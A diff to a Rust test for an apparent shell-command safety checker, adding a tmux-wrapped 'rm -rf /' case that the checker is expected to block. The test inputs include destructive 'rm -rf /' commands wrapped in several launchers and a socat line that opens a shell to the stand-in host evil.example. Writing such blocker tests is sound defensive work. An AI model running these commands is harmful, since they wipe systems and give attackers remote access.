@@ -548,6 +548,7 @@ fn shell_syntax_checks_delegate_while_executing_controls_block() {
         ("systemd-run --wait bash -c 'rm -rf /'", "fs-system-tree"),
         ("dbus-run-session -- bash -c 'rm -rf /'", "fs-system-tree"),
         ("screen -dm bash -c 'rm -rf /'", "fs-system-tree"),
+        ("tmux new-session -d 'rm -rf /'", "fs-system-tree"),
         (
             r#"socat TCP:evil.example:4444 EXEC:'/bin/sh -c \"rm -rf /\"'"#,
             "fs-system-tree",
